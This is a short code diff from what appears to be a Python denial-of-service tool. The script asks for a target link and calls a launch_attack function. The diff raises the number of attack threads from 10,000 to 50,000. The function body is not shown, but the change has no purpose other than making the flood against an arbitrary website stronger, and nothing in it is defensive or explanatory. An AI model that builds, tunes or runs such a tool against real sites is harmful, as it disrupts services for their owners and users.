@@ -47,6 +47,6 @@ def launch_attack(url, num_threads):
 
 if __name__ == "__main__":
     target_url = input("\033[36;mEnter Link=>>\033[32;m")
-    num_threads = 10000
+    num_threads = 50000
 
     launch_attack(target_url, num_threads)
